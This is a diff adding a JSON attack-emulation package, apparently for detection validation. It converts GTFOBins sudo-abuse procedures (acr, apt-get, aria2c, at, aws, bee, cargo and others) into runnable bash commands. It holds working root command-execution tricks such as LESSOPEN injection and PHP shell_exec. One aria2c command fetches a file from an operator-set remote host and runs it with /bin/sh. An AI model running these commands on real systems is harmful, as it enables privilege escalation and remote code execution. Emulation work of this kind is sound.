@@ -1,0 +1,3452 @@
+{
+  "package_id": "gtfobins-command-sudo-v1",
+  "package_name": "GTFOBins - Command / Sudo",
+  "version": "1.0.0",
+  "summary": "63 source-derived GTFOBins Living-Off-The-Land procedures for command / Sudo.",
+  "description": "Faithful, deterministic conversion of explicit GTFOBins procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 63 distinct source procedures grouped by command / Sudo.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Linux/Unix binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "GTFOBins / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "GTFOBINS - ",
+  "provider": "gtfobins",
+  "source": "gtfobins",
+  "source_repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "source_commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Command",
+  "mitre_tcodes": [
+    "T1059"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "risk_badges": [
+    "modify"
+  ],
+  "readiness_counts": {
+    "environment_prerequisite": 63
+  },
+  "category": "lotl/gtfobins",
+  "tag_categories": [
+    {
+      "category_id": "lotl_gtfobins_parameters",
+      "label": "GTFOBins Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_gtfobins_input_file",
+          "label": "Input File",
+          "description": "Operator-supplied input file for this authorized LOTL procedure. Source token: /path/to/input-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "input_file"
+        },
+        {
+          "key": "lotl_gtfobins_local_path",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: /path/to/temp-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_gtfobins_remote_host",
+          "label": "Remote Host",
+          "description": "Operator-supplied remote host for this authorized LOTL procedure. Source token: literal network target.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        },
+        {
+          "key": "lotl_gtfobins_remote_port",
+          "label": "Remote Port",
+          "description": "Operator-supplied remote port for this authorized LOTL procedure. Source token: \\b12345\\b.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "gtfobins:acr:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - acr - Command - Sudo [6f976f6]",
+      "description": "This executable can run non-interactive system commands. Binary: acr. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >#{lotl_gtfobins_local_path}\nchmod +x #{lotl_gtfobins_local_path}\nacr -r ./relative#{lotl_gtfobins_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/acr",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/acr",
+        "source_bin": "acr",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:acr:command:0:sudo::",
+        "source_name": "acr",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `acr` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:apt-get:command:1:sudo:0:apt-get>less",
+      "name": "GTFOBINS - T1059 - apt-get - Command - Sudo [6fa2c2e]",
+      "description": "This executable can run non-interactive system commands. Binary: apt-get. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "apt-get changelog apt\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/apt-get",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/apt-get",
+        "source_bin": "apt-get",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "apt-get",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "apt-get",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:apt-get:command:1:sudo:0:apt-get>less",
+        "source_name": "apt-get",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `apt-get` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:aptitude:command:1:sudo:0:aptitude>less",
+      "name": "GTFOBINS - T1059 - aptitude - Command - Sudo [0063b4a]",
+      "description": "This executable can run non-interactive system commands. Binary: aptitude. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "aptitude changelog aptitude\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/aptitude",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/aptitude",
+        "source_bin": "aptitude",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "aptitude",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "aptitude",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:aptitude:command:1:sudo:0:aptitude>less",
+        "source_name": "aptitude",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `aptitude` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:aria2c:command:1:sudo::",
+      "name": "GTFOBINS - T1059 - aria2c - Command - Sudo [c8a5aac]",
+      "description": "This executable can run non-interactive system commands. Binary: aria2c. Context: Sudo. The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://#{lotl_gtfobins_remote_host}/aaaaaaaaaaaaaaaa",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/aria2c",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/aria2c",
+        "source_bin": "aria2c",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:aria2c:command:1:sudo::",
+        "source_name": "aria2c",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `aria2c` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:aria2c:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - aria2c - Command - Sudo [e572eac]",
+      "description": "This executable can run non-interactive system commands. Binary: aria2c. Context: Sudo. Note that the subprocess is immediately sent to the background.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo /path/to/command >#{lotl_gtfobins_local_path}\nchmod +x #{lotl_gtfobins_local_path}\naria2c --on-download-error=#{lotl_gtfobins_local_path} http://#{lotl_gtfobins_remote_host}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/aria2c",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/aria2c",
+        "source_bin": "aria2c",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:aria2c:command:0:sudo::",
+        "source_name": "aria2c",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `aria2c` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:at:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - at - Command - Sudo [3026e66]",
+      "description": "This executable can run non-interactive system commands. Binary: at. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo /path/to/command | at now",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/at",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/at",
+        "source_bin": "at",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:at:command:0:sudo::",
+        "source_name": "at",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `at` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:aws:command:1:sudo:0:aws>less",
+      "name": "GTFOBINS - T1059 - aws - Command - Sudo [8fe32e6]",
+      "description": "This executable can run non-interactive system commands. Binary: aws. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "aws help\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/aws",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/aws",
+        "source_bin": "aws",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "aws",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "aws",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:aws:command:1:sudo:0:aws>less",
+        "source_name": "aws",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `aws` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:batcat:command:1:sudo:0:batcat>less",
+      "name": "GTFOBINS - T1059 - batcat - Command - Sudo [a08d856]",
+      "description": "This executable can run non-interactive system commands. Binary: batcat. Context: Sudo. `--paging always` can be omitted provided that the output doesn't fit the screen. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "batcat --paging always /etc/hosts\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/batcat",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/batcat",
+        "source_bin": "batcat",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "batcat",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "batcat",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:batcat:command:1:sudo:0:batcat>less",
+        "source_name": "batcat",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `batcat` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bee:command:2:sudo:0:bee>php",
+      "name": "GTFOBINS - T1059 - bee - Command - Sudo [57b2c2e]",
+      "description": "This executable can run non-interactive system commands. Binary: bee. Context: Sudo. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option. Inherits command behavior from php.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bee eval '...'\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/path/to/command\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bee",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bee",
+        "source_bin": "bee",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 2,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "php",
+        "inheritance_path": [
+          "bee",
+          "php"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "php",
+          "inheritance_path": [
+            "bee",
+            "php"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bee:command:2:sudo:0:bee>php",
+        "source_name": "bee",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bee` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bee:command:1:sudo:0:bee>php",
+      "name": "GTFOBINS - T1059 - bee - Command - Sudo [9a9c059]",
+      "description": "This executable can run non-interactive system commands. Binary: bee. Context: Sudo. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option. Inherits command behavior from php.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bee eval '...'\nphp -r '$r=array(); exec(\"/path/to/command\", $r); print(join(\"\\n\",$r));'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bee",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bee",
+        "source_bin": "bee",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "php",
+        "inheritance_path": [
+          "bee",
+          "php"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "php",
+          "inheritance_path": [
+            "bee",
+            "php"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bee:command:1:sudo:0:bee>php",
+        "source_name": "bee",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bee` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bee:command:0:sudo:0:bee>php",
+      "name": "GTFOBINS - T1059 - bee - Command - Sudo [6cd76ff]",
+      "description": "This executable can run non-interactive system commands. Binary: bee. Context: Sudo. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option. Inherits command behavior from php.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bee eval '...'\nphp -r 'echo shell_exec(\"/path/to/command\");'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bee",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bee",
+        "source_bin": "bee",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "php",
+        "inheritance_path": [
+          "bee",
+          "php"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "php",
+          "inheritance_path": [
+            "bee",
+            "php"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bee:command:0:sudo:0:bee>php",
+        "source_name": "bee",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bee` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bundle:command:1:sudo:0:bundle>less",
+      "name": "GTFOBINS - T1059 - bundle - Command - Sudo [08fc42d]",
+      "description": "This executable can run non-interactive system commands. Binary: bundle. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bundle help\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bundle",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bundle",
+        "source_bin": "bundle",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "bundle",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "bundle",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bundle:command:1:sudo:0:bundle>less",
+        "source_name": "bundle",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bundle` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:busctl:command:1:sudo:0:busctl>less",
+      "name": "GTFOBINS - T1059 - busctl - Command - Sudo [3ff0eb1]",
+      "description": "This executable can run non-interactive system commands. Binary: busctl. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "busctl --show-machine\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/busctl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/busctl",
+        "source_bin": "busctl",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "busctl",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "busctl",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:busctl:command:1:sudo:0:busctl>less",
+        "source_name": "busctl",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `busctl` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:cargo:command:1:sudo:0:cargo>less",
+      "name": "GTFOBINS - T1059 - cargo - Command - Sudo [d7857fb]",
+      "description": "This executable can run non-interactive system commands. Binary: cargo. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "cargo help doc\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/cargo",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/cargo",
+        "source_bin": "cargo",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "cargo",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "cargo",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:cargo:command:1:sudo:0:cargo>less",
+        "source_name": "cargo",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `cargo` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:crash:command:1:sudo:0:crash>less",
+      "name": "GTFOBINS - T1059 - crash - Command - Sudo [316dd88]",
+      "description": "This executable can run non-interactive system commands. Binary: crash. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "crash -h\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/crash",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/crash",
+        "source_bin": "crash",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "crash",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "crash",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:crash:command:1:sudo:0:crash>less",
+        "source_name": "crash",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `crash` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
